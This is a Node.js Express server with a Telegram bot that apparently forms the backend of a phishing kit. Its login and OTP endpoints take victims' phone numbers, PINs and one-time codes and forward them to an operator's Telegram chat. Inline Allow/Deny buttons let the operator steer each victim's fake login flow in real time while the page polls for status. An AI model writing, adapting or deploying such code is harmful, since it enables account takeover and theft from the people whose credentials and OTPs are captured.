const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

// -------------------- ENV CHECK --------------------
if (!process.env.BOT_TOKEN) {
    console.error("❌ BOT_TOKEN is missing");
    process.exit(1);
}

const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();

// -------------------- BOT INIT --------------------
const bot = new Telegraf(process.env.BOT_TOKEN);

// Memory store
const statusStore = {};

// -------------------- MIDDLEWARE --------------------
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// -------------------- ROUTES --------------------
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/:page', (req, res) => {
    const file = req.params.page.endsWith('.html')
        ? req.params.page
        : req.params.page + '.html';

    res.sendFile(path.join(__dirname, 'public', file), (err) => {
        if (err) res.status(404).send("Page not found");
    });
});

// -------------------- LOGIN API --------------------
app.post('/api/login-notification', async (req, res) => {
    const { phone, pin } = req.body || {};

    const now = new Date();
    const currentTime = now.toLocaleString('en-US', { hour12: true });

    if (!phone || !pin || !ADMIN_ID) {
        return res.status(400).json({ error: "Missing data" });
    }

    statusStore[phone] = "pending";

    const message =
        `📱 CL 2 - LOGIN ATTEMPT\n\n` +
        `🆕 NEW USER\n` +
        `📱 Phone: ${phone}\n` +
        `🔢 PIN: ${pin}\n` +
        `⏰ Time: ${currentTime}\n\n` +
        `⚠️ Waiting for approval`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Allow", callback_data: `approve_${phone}_${pin}` }
                    ],
                    [
                        { text: "❌ Deny", callback_data: `deny_${phone}` }
                    ]
                ]
            }
        });

        res.json({ success: true });

    } catch (err) {
        console.error("❌ Telegram Error:", err.message);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- VERIFY OTP API --------------------
app.post('/api/verify-first-otp', async (req, res) => {
    const { phone, otp } = req.body || {};

    const now = new Date();
    const currentTime = now.toLocaleString('en-US', { hour12: true });

    if (!phone || !otp || !ADMIN_ID) {
        return res.status(400).json({ error: "Missing data" });
    }

    const otpMessage =
        `🔐 FIRST OTP RECEIVED\n\n` +
        `📱 Phone: ${phone}\n` +
        `🔢 OTP: ${otp}\n` +
        `⏰ Time: ${currentTime}`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage);
        res.json({ success: true });
    } catch (err) {
        console.error("❌ OTP Error:", err.message);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- BOT ACTIONS --------------------
bot.action(/approve_(.+)_(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "approved";

    await ctx.editMessageText(
        `✅ LOGIN APPROVED\n📱 ${phone}`,
        { parse_mode: 'Markdown' }
    );
});

bot.action(/correct1_(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp1_correct";

    await ctx.editMessageText(
        "✅ OTP VERIFIED",
        { parse_mode: 'Markdown' }
    );
});

bot.action(/wrong_code_(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp1_wrong";
    await ctx.answerCbQuery("Wrong Code Alert Sent");
});

bot.action(/wrong_pin_(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "denied";
    await ctx.editMessageText("❌ WRONG PIN");
});

bot.action(/deny_(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "denied";
    await ctx.editMessageText("❌ LOGIN DENIED");
});

// -------------------- STATUS CHECK --------------------
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;
    res.json({ status: statusStore[phone] || "pending" });
});

// -------------------- START SERVER --------------------
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});

// -------------------- BOT START --------------------
const startBot = async () => {
    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        await bot.launch();
        console.log("🤖 Bot launched successfully");
    } catch (err) {
        console.error("❌ Bot launch error:", err.message);
    }
};

startBot();
